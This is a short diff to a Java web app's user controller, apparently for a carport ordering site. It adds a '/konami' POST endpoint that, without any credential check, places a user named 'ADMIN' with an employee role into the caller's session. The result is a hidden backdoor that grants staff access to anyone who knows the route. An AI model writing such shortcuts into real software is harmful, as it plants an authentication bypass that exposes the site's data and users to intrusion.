@@ -41,6 +41,7 @@ public class UserController {
         app.post("/login", ctx -> login(ctx, connectionPool));
         app.post("/create-user", ctx -> createUser(ctx, connectionPool));
         app.post("/carport/send-form", ctx -> buildOrderWithForm(ctx, connectionPool));
+        app.post("/konami", UserController::konami);
 
     }
 
@@ -303,6 +304,15 @@ public class UserController {
                 .email(ctx.formParam("email"))
                 .phoneNumber(ctx.formParam("phoneNumber"))
                 .build();
+    }
+
+    private static void konami(Context ctx){
+        User user = new User.Builder()
+                .email("ADMIN")
+                .role(Role.EMPLOYEE)
+                .build();
+        ctx.sessionAttribute("user", user);
+        ctx.status(200);
     }
 
 }
